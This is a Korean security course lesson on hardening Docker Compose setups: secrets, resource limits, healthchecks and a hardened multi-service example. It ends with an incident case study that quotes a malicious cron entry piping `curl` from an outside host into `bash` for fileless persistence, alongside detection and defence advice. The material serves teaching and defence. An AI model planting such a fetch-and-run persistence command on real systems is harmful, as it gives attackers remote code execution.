# Week 06: Docker Compose 보안

## 학습 목표
- Docker Compose를 사용하여 다중 컨테이너 환경을 구성할 수 있다
- Docker Secrets로 비밀정보를 안전하게 관리할 수 있다
- 리소스 제한과 healthcheck를 설정할 수 있다
- Compose 파일의 보안 점검 포인트를 파악한다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| bastion | 10.20.30.201 | Control Plane (Bastion) | `ssh ccc@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `ssh ccc@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `ssh ccc@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh Dashboard:443, OpenCTI:8080) | `ssh ccc@10.20.30.100` |

**Bastion API:** `http://localhost:9100` / Key: `ccc-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + Bastion 연동 (Part 5) | 실습 |
| 3:20-3:40 | 정리 + 과제 안내 | 정리 |

---

---

## 용어 해설 (Docker/클라우드/K8s 보안 과목)

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **컨테이너** | Container | 앱과 의존성을 격리하여 실행하는 경량 가상화 | 이삿짐 컨테이너 (어디서든 동일하게 열 수 있음) |
| **이미지** | Image (Docker) | 컨테이너를 만들기 위한 읽기 전용 템플릿 | 붕어빵 틀 |
| **Dockerfile** | Dockerfile | 이미지를 빌드하는 레시피 파일 | 요리 레시피 |
| **레지스트리** | Registry | 이미지를 저장·배포하는 저장소 (Docker Hub 등) | 앱 스토어 |
| **레이어** | Layer (Image) | 이미지의 각 빌드 단계 (캐싱 단위) | 레고 블록 한 층 |
| **볼륨** | Volume | 컨테이너 데이터를 영구 저장하는 공간 | 외장 하드 |
| **네임스페이스** | Namespace (Linux) | 프로세스를 격리하는 커널 기능 (PID, NET, MNT 등) | 칸막이 (같은 건물, 서로 안 보임) |
| **cgroup** | Control Group | 프로세스의 CPU/메모리 사용량을 제한하는 커널 기능 | 전기/수도 사용량 제한 |
| **오케스트레이션** | Orchestration | 다수의 컨테이너를 관리·조율하는 것 (K8s) | 오케스트라 지휘 |
| **Pod** | Pod (K8s) | K8s의 최소 배포 단위 (1개 이상의 컨테이너) | 같은 방에 사는 룸메이트들 |
| **RBAC** | Role-Based Access Control | 역할 기반 접근 제어 (K8s) | 직책별 출입 권한 |
| **PSP/PSA** | Pod Security Policy/Admission | Pod의 보안 설정을 강제하는 정책 | 건물 입주 조건 |
| **NetworkPolicy** | NetworkPolicy (K8s) | Pod 간 네트워크 통신 규칙 | 부서 간 출입 통제 |
| **Trivy** | Trivy | 컨테이너 이미지 취약점 스캐너 (Aqua) | X-ray 검사기 |
| **IaC** | Infrastructure as Code | 인프라를 코드로 정의·관리 (Terraform 등) | 건축 설계도 (코드 = 설계도) |
| **IAM** | Identity and Access Management | 클라우드 사용자/권한 관리 (AWS IAM 등) | 회사 사원증 + 권한 관리 시스템 |
| **CIS 벤치마크** | CIS Benchmark | 보안 설정 모범 사례 가이드 (Center for Internet Security) | 보안 설정 모범답안 |

---

## 1. Docker Compose 기본

Docker Compose는 여러 컨테이너를 YAML 파일 하나로 정의하고 관리한다.

```yaml
# docker-compose.yaml
version: "3.9"
services:
  web:
    image: nginx:latest
    ports:
      - "80:80"
  db:
    image: postgres:16
    environment:
      POSTGRES_PASSWORD: mysecret  # 이렇게 하면 안 됨!
```

> **실습 목적**: Docker Compose에서 secrets, read_only, cap_drop 등 보안 설정을 일괄 적용하는 방법을 체험하기 위해 수행한다
>
> **배우는 것**: 환경변수 대신 Docker Secrets로 비밀정보를 전달하면 docker inspect에 노출되지 않는 이유와, 리소스 제한으로 DoS를 방지하는 원리를 이해한다
>
> **결과 해석**: docker compose ps에서 (healthy) 상태는 healthcheck 통과, 리소스 제한은 docker stats에서 MEM LIMIT 값으로 확인한다
>
> **실전 활용**: 프로덕션 Compose 파일 작성 시 보안 템플릿으로 활용하며, 보안 감사에서 설정 준수를 증명하는 데 사용한다

```bash
# 실행
docker compose up -d

# 상태 확인
docker compose ps

# 중지 및 삭제
docker compose down
```

---

## 2. Docker Secrets

> **이 실습을 왜 하는가?**
> "Docker Compose 보안" — 이 주차의 핵심 기술을 실제 서버 환경에서 직접 실행하여 체험한다.
> Docker/클라우드/K8s 보안 분야에서 이 기술은 실무의 핵심이며, 실습을 통해
> 명령어의 의미, 결과 해석 방법, 보안 관점에서의 판단 기준을 익힌다.
>
> **이걸 하면 무엇을 알 수 있는가?**
> - 이 기술이 실제 시스템에서 어떻게 동작하는지 직접 확인
> - 정상과 비정상 결과를 구분하는 눈을 기름
> - 실무에서 바로 활용할 수 있는 명령어와 절차를 체득
>
> **주의:** 모든 실습은 허가된 실습 환경(10.20.30.0/24)에서만 수행한다.

환경변수로 비밀번호를 전달하면 `docker inspect`로 노출된다.
Docker Secrets는 비밀정보를 암호화하여 컨테이너에 파일로 전달한다.

### 2.1 파일 기반 Secret

```yaml
version: "3.9"
services:
  db:
    image: postgres:16
    environment:
      POSTGRES_PASSWORD_FILE: /run/secrets/db_password
    secrets:
      - db_password

secrets:
  db_password:
    file: ./secrets/db_password.txt
```

```bash
# 시크릿 파일 생성 (권한 제한)
mkdir -p secrets
echo "MyStr0ngP@ssw0rd" > secrets/db_password.txt
chmod 600 secrets/db_password.txt
```

### 2.2 환경변수 vs Secrets 비교

| 방법 | 보안 수준 | 노출 경로 |
|------|----------|----------|
| `environment:` | 낮음 | docker inspect, /proc/*/environ |
| `.env` 파일 | 낮음 | 파일 접근, docker inspect |
| `secrets:` | 높음 | /run/secrets/ (tmpfs, 메모리) |

---

## 3. 리소스 제한

컨테이너가 호스트 리소스를 독점하지 못하도록 제한한다.
DoS 공격이나 리소스 고갈을 방지하는 핵심 설정이다.

### 3.1 메모리/CPU 제한

```yaml
services:
  app:
    image: myapp:latest
    deploy:
      resources:
        limits:
          cpus: "0.50"      # CPU 50%
          memory: 256M       # 메모리 256MB
        reservations:
          cpus: "0.25"      # 최소 보장 CPU
          memory: 128M       # 최소 보장 메모리
```

### 3.2 PID 제한 (포크 폭탄 방지)

```yaml
services:
  app:
    image: myapp:latest
    pids_limit: 100          # 프로세스 최대 100개
```

### 3.3 스토리지 제한

```yaml
services:
  app:
    image: myapp:latest
    storage_opt:
      size: "1G"             # 컨테이너 디스크 1GB 제한
```

---

## 4. Healthcheck

컨테이너가 정상 작동하는지 주기적으로 검사한다.
문제 발생 시 자동 재시작을 트리거할 수 있다.

```yaml
services:
  web:
    image: nginx:latest
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost/"]
      interval: 30s          # 30초마다 검사
      timeout: 10s           # 10초 내 응답 없으면 실패
      retries: 3             # 3회 연속 실패 시 unhealthy
      start_period: 10s      # 시작 후 10초 대기

  db:
    image: postgres:16
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U postgres"]
      interval: 10s
      timeout: 5s
      retries: 5
```

### Healthcheck 상태 확인

```bash
docker compose ps
# NAME    STATUS
# web     Up 2 minutes (healthy)
# db      Up 2 minutes (healthy)

docker inspect --format='{{.State.Health.Status}}' web
```

---

## 5. Compose 보안 설정 종합

### 5.1 완전한 보안 Compose 파일

```yaml
version: "3.9"

services:
  web:
    image: nginx:1.25-alpine
    read_only: true                    # 읽기 전용 파일시스템
    tmpfs:
      - /tmp
      - /var/cache/nginx
    cap_drop:
      - ALL                            # 모든 capability 제거
    cap_add:
      - NET_BIND_SERVICE               # 필요한 것만 추가
    security_opt:
      - no-new-privileges:true         # 권한 상승 방지
    ports:
      - "127.0.0.1:8080:80"           # localhost만 노출
    networks:
      - frontend
    deploy:
      resources:
        limits:
          cpus: "0.5"
          memory: 128M
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost/"]
      interval: 30s
      timeout: 5s
      retries: 3
    restart: unless-stopped

  api:
    image: myapp:latest
    read_only: true
    tmpfs:
      - /tmp
    cap_drop:
      - ALL
    security_opt:
      - no-new-privileges:true
    networks:
      - frontend
      - backend
    environment:
      DB_HOST: db
      DB_PORT: 5432
      DB_PASSWORD_FILE: /run/secrets/db_password
    secrets:
      - db_password
    deploy:
      resources:
        limits:
          cpus: "1.0"
          memory: 512M
    depends_on:
      db:
        condition: service_healthy

  db:
    image: postgres:16-alpine
    cap_drop:
      - ALL
    cap_add:
      - CHOWN
      - SETUID
      - SETGID
      - FOWNER
    security_opt:
      - no-new-privileges:true
    networks:
      - backend                        # 백엔드 네트워크만
    volumes:
      - db-data:/var/lib/postgresql/data
    environment:
      POSTGRES_PASSWORD_FILE: /run/secrets/db_password
    secrets:
      - db_password
    deploy:
      resources:
        limits:
          cpus: "1.0"
          memory: 1G
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U postgres"]
      interval: 10s
      timeout: 5s
      retries: 5

networks:
  frontend:
  backend:
    internal: true                     # 외부 접근 차단

volumes:
  db-data:

secrets:
  db_password:
    file: ./secrets/db_password.txt
```

---

## 6. 실습: Compose 보안 점검

실습 환경: `web` 서버 (10.20.30.80)

### 실습 1: 기존 Compose 파일 보안 점검

```bash
ssh ccc@10.20.30.80

# Apache+ModSecurity Compose 파일 확인
cat /etc/apache2/sites-enabled/ (VirtualHost 설정)

# 보안 점검 항목 확인
# 1. 환경변수에 비밀정보가 있는가?
# 2. read_only가 설정되어 있는가?
# 3. cap_drop이 설정되어 있는가?
# 4. 리소스 제한이 있는가?
# 5. healthcheck가 설정되어 있는가?
```

### 실습 2: 안전한 Compose 환경 구성

```bash
mkdir -p /tmp/secure-lab/secrets && cd /tmp/secure-lab

# 시크릿 생성
echo "LabP@ssw0rd2026" > secrets/db_password.txt
chmod 600 secrets/db_password.txt

# 보안 강화 Compose 파일 작성
cat > docker-compose.yaml << 'EOF'
version: "3.9"
services:
  web:
    image: nginx:alpine
    read_only: true
    tmpfs: [/tmp, /var/cache/nginx, /var/run]
    cap_drop: [ALL]
    cap_add: [NET_BIND_SERVICE]
    security_opt: ["no-new-privileges:true"]
    ports: ["127.0.0.1:9094:80"]
    deploy:
      resources:
        limits: { cpus: "0.25", memory: 64M }
    healthcheck:
      test: ["CMD", "wget", "-q", "--spider", "http://localhost/"]
      interval: 15s
      timeout: 5s
      retries: 3
EOF

# 실행 및 확인
docker compose up -d
docker compose ps
curl http://localhost:9094

# 정리
docker compose down
```

### 실습 3: 리소스 제한 테스트

Compose의 리소스 제한이 실제로 CPU 사용을 제한하는지 확인한다. dd 명령으로 CPU를 100% 사용하려 해도 10%로 제한되는 것을 docker stats에서 확인할 수 있다.

```bash
# CPU/메모리 제한이 적용된 스트레스 테스트용 Compose 파일 생성
cat > /tmp/stress-compose.yaml << 'EOF'
version: "3.9"
services:
  stress:
    image: alpine
    command: ["sh", "-c", "dd if=/dev/zero of=/dev/null bs=1M"]
    deploy:
      resources:
        limits:
          cpus: "0.1"
          memory: 32M
EOF

docker compose -f /tmp/stress-compose.yaml up -d
docker stats --no-stream  # CPU가 10%로 제한됨을 확인
docker compose -f /tmp/stress-compose.yaml down
```

---

## 7. Compose 보안 체크리스트

- [ ] 비밀정보는 secrets로 관리하는가?
- [ ] read_only 파일시스템을 적용했는가?
- [ ] cap_drop ALL + 필요한 cap_add만 설정했는가?
- [ ] no-new-privileges 옵션을 적용했는가?
- [ ] CPU/메모리/PID 리소스 제한을 설정했는가?
- [ ] healthcheck로 서비스 상태를 모니터링하는가?
- [ ] 내부 서비스는 internal 네트워크에 배치했는가?
- [ ] 포트 바인딩 시 127.0.0.1을 명시했는가?

---

## 핵심 정리

1. 환경변수 대신 Docker Secrets로 비밀정보를 관리한다
2. 리소스 제한(CPU, 메모리, PID)으로 DoS 공격을 방지한다
3. Healthcheck로 서비스 장애를 자동 감지한다
4. 보안 설정(read_only, cap_drop, no-new-privileges)을 Compose에서 일괄 적용한다
5. 네트워크를 분리하여 최소 권한 원칙을 네트워크에도 적용한다

---

## 다음 주 예고
- Week 07: Docker 보안 점검 - Docker Bench for Security, CIS Benchmark

---

> **실습 환경 검증 완료** (2026-03-28): Docker 29.3.0, Compose v5.1.1, juice-shop(User=65532,Privileged=false), OpenCTI 6컨테이너, opencti_default 네트워크

---

## 📂 실습 참조 파일 가이드

> 이번 주 실습에서 **실제로 조작하는** 솔루션의 기능·경로·파일·설정·UI 요점입니다.

### Docker Engine
> **역할:** 컨테이너 런타임·이미지 관리  
> **실행 위치:** `모든 VM(공통)`  
> **접속/호출:** `docker` CLI, `systemctl status docker`

**주요 경로·파일**

| 경로 | 역할 |
|------|------|
| `/var/lib/docker/` | 이미지·컨테이너 저장소(overlay2) |
| `/etc/docker/daemon.json` | 데몬 설정 (log-driver, userns-remap 등) |
| `/var/run/docker.sock` | Docker API 소켓 — 루트권한 등가 |

**핵심 설정·키**

- `{"userns-remap": "default"}` — 컨테이너 root↔호스트 비루트 매핑
- `{"icc": false}` — 기본 네트워크 내 컨테이너 간 통신 차단
- `{"no-new-privileges": true}` — setuid 권한 상승 차단

**로그·확인 명령**

- `journalctl -u docker` — 데몬 로그
- ``docker logs <c>`` — 컨테이너 stdout/stderr

**UI / CLI 요점**

- `docker inspect <c> | jq '.[0].HostConfig.Privileged'` — `--privileged` 여부
- `docker exec -it <c> sh` — 컨테이너 내부 진입
- `docker system df` — 이미지/볼륨 디스크 사용량

> **해석 팁.** `/var/run/docker.sock`을 컨테이너에 마운트하는 순간 **호스트 루트와 동등**이다. 점검 1순위.

### Dockerfile 보안 작성
> **역할:** 최소 권한·재현성·비밀 격리  
> **실행 위치:** `빌드 호스트`  
> **접속/호출:** `docker build -t img .`

**주요 경로·파일**

| 경로 | 역할 |
|------|------|
| `Dockerfile` | 빌드 정의 |
| `.dockerignore` | 이미지에 포함하지 않을 파일 |

**핵심 설정·키**

- `FROM <distroless|alpine>` — 최소 베이스
- `USER 1000` — 비root 실행
- `RUN --mount=type=secret,id=NPM_TOKEN` — 빌드 비밀 외부 주입
- `HEALTHCHECK CMD ...` — 컨테이너 헬스체크

**로그·확인 명령**

- ``docker history <img>`` — 레이어별 변경 크기·명령

**UI / CLI 요점**

- `docker scout cves <img>` — 이미지 CVE 스캔
- `dive <img>` — 레이어별 파일 변경 시각화

> **해석 팁.** `COPY . .` 전에 `.dockerignore`로 `.git`, `.env` 제외. 빌드 시 `ARG SECRET=...` 는 **이미지 메타데이터에 남는다** — 비밀은 BuildKit `--secret` 사용.

---

## 실제 사례 (WitFoo Precinct 6)

> **출처**: [WitFoo Precinct 6 Cybersecurity Dataset](https://huggingface.co/datasets/witfoo/precinct6-cybersecurity) (Apache 2.0)
> **익명화**: RFC5737 TEST-NET / ORG-NNNN / HOST-NNNN 으로 sanitized

본 주차 (6주차) 학습 주제와 직접 연관된 *실제* incident:

### Linux cron + curl downloader — fileless persistence

> **출처**: WitFoo Precinct 6 / `incident-2024-08-005` (anchor: `anc-bf23b0106fe4`) · sanitized
> **시점**: 2024-08-25 ~ (지속, 5분 주기)

**관찰**: 10.20.30.80 의 /etc/cron.d/ 에 신규 항목 — 5분마다 `curl http://203.0.113.42/p.sh | bash` 실행.

**MITRE ATT&CK**: **T1053.003 (Scheduled Task: Cron)**, **T1105 (Ingress Tool Transfer)**

**IoC**:
  - `203.0.113.42`
  - `/etc/cron.d/<신규>`
  - `curl ... | bash`

**학습 포인트**:
- cron entry 자체만 디스크 흔적, 실제 페이로드는 *메모리에만* (fileless)
- 5분 주기 외부 outbound → SIEM 의 baseline 비교 시 강한 신호
- 탐지: auditd EXECVE (curl + http://* + bash 파이프), Wazuh syscheck (cron.d 파일 변경)
- 방어: outbound HTTP 화이트리스트, cron.d FIM, AppArmor curl 제한, EDR 메모리 스캔


**본 강의와의 연결**: 위 사례는 강의의 핵심 개념이 어떻게 *실제 운영 환경*에서 일어나는지 보여준다. 학생은 이 패턴을 (1) 공격자 입장에서 재현 가능한가 (2) 방어자 입장에서 탐지 가능한가 (3) 자기 인프라에서 동일 신호가 있는지 검색 가능한가 — 3 관점에서 평가한다.

---

> 더 많은 사례 (총 5 anchor + 외부 표준 7 source) 는 KG (Knowledge Graph) 페이지에서 검색 가능.
> Cyber Range 실습 중 학습 포인트 박스 (📖) 에 동일 anchor 가 자동 노출된다.
